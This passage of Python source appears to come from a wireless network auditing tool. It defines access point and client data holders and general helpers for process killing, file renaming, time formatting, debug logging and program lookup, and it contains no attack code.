        self.encryption = encryption
        self.ssid = ssid
        self.wps = False  # Default to non-WPS-enabled router.
        self.key = ''


class Client:
    """
        Holds data for a Client (device connected to Access Point/Router)
    """

    def __init__(self, bssid, station, power):
        self.bssid = bssid
        self.station = station
        self.power = power

def send_interrupt(process):
    import psutil
    """
        Sends interrupt signal to process's PID.
    """
    pControl = psutil.Process(process.pid)
    try:
        debug_log("Killing PID: " + str(process.pid))
        pControl.kill()
        # os.kill(process.pid, SIGTERM)
    except OSError as e:
        debug_log("Kill failed: OSError: " + str(e))
        pass  # process cannot be killed
    except TypeError as e:
        debug_log("Kill failed: TypeError: " + str(e))
        pass  # pid is incorrect type
    except UnboundLocalError as e:
        debug_log("Kill failed: UnboundLocalError: " + str(e))
        pass  # 'process' is not defined
    except AttributeError as e:
        debug_log("Kill failed: AttributeError: " + str(e))
        pass  # Trying to kill "None"
        
def rename(old, new):
    """
        Renames file 'old' to 'new', works with separate partitions.
        Thanks to hannan.sadar
    """
    try:
        os.rename(old, new)
    except os.error as detail:
        if detail.errno == errno.EXDEV:
            try:
                copy(old, new)
            except:
                os.unlink(new)
                raise
                os.unlink(old)
        # if desired, deal with other errors
        else:
            raise
            
def sec_to_hms(sec):
    """
        Converts integer sec to h:mm:ss format
    """
    if sec <= -1: return '[endless]'
    h = sec / 3600
    sec %= 3600
    m = sec / 60
    sec %= 60
    return '[%d:%02d:%02d]' % (h, m, sec)            

"""def program_exists(program):
    ###
    #    Uses 'which' (linux command) to check if a program is installed.
    ###

    proc = Popen(['which', program], stdout=PIPE, stderr=PIPE)
    txt = proc.communicate()
    if txt[0].strip() == '' and txt[1].strip() == '':
        return False
    if txt[0].strip() != '' and txt[1].strip() == '':
        return True

    return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)
"""

def debug_log(message):
    from datetime import datetime
    fullMessage = datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " - " + message + '\n'
    with open('/usr/share/savage/savage-debug.log','a+') as debugLog:
        debugLog.write(fullMessage)

def program_exists(name):
    """Check whether `name` is on PATH and marked as executable."""

    # from whichcraft import which
    from shutil import which

    return which(name) is not None


if __name__ == '__main__':
    main()
